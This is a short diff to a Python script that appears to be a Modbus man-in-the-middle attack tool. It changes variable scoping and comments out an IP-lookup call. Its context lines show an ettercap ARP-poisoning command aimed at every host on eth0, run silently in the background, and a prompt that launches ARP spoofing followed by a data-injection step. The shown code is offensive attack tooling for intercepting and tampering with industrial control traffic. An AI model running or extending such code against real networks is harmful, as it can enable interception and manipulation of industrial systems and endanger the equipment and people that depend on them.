@@ -32,6 +32,7 @@ def get_ip():
     sleep(1)
 
 def arp_spoofing():
+    global mb_server, mb_client
     console.log(f"MB_server={mb_server['ip']}")
     console.log(f"MB_client={mb_client['ip']}")
     arp2 = 'nohup ettercap -Tq -i eth0 -M ARP /// /// >/dev/null 2>&1 &'
@@ -129,7 +130,7 @@ def data_injection():
         queue.unbind()
 
 if __name__ == '__main__':
-    get_ip()
+    # get_ip()
     if( Prompt.ask("START MODBUS_MITM? [y/n]", default='unknown') == 'y'):
         arp_spoofing()
         data_injection()
